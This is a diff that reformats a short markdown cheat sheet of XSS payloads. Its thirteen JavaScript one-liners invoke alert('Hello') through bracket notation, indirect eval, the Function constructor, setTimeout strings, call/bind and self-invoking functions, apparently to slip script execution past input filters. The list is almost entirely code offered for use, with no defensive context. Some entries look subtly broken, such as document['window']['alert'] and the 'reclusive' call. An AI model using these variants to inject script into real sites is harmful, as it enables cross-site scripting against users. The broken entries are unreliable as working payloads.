@@ -3,41 +3,67 @@
 XSS payloads
 
 ## Array Notation  
-`window['alert']('Hello');`
+```js
+window['alert']('Hello');```
+
 
 ## Chained Array Notation  
-`this['window']['alert']('Hello');`
+```js
+this['window']['alert']('Hello');```
+
 
 ## Indirect Reference Using Call/Apply  
-`(0, eval)('alert("Hello")');`
+```js
+(0, eval)('alert("Hello")');```
+
 
 ## Calling via Function Constructor  
-`(new Function('alert("Hello")'))();`
+```js
+(new Function('alert("Hello")'))();```
+
 
 ## SetTimeout or SetInterval  
-`setTimeout('alert("Hello")', 0);`
+```js
+setTimeout('alert("Hello")', 0);```
+
 
 ## Indirect Reference with call  
-`window.alert.call(this, 'Hello');`
+```js
+window.alert.call(this, 'Hello');```
+
 
 ## Using bind  
-`const alertBind = alert.bind(window);
-alertBind('Hello');`
+```js
+const alertBind = alert.bind(window);
+alertBind('Hello');```
+
 
 ## anon functions  
-`(() => alert('Hello'))();`
+```js
+(() => alert('Hello'))();```
+
 
 ## Self-Invoking Function with alert  
-`(function(){ alert('Hello'); })();`
+```js
+(function(){ alert('Hello'); })();```
+
 
 ## Function call  
-`Function.prototype.call.call(alert, window, 'Hello');`
+```js
+Function.prototype.call.call(alert, window, 'Hello');```
+
 
 ## Global this  
-`(this || window).alert('Hello');`
+```js
+(this || window).alert('Hello');```
+
 
 ## chaining doc and window  
-`document['window']['alert']('Hello');`
+```js
+document['window']['alert']('Hello');```
+
 
 ## Reclusive indirect function calling  
-`(((f) => f(f))((f) => alert('Hello')))();`
+```js
+(((f) => f(f))((f) => alert('Hello')))();```
+
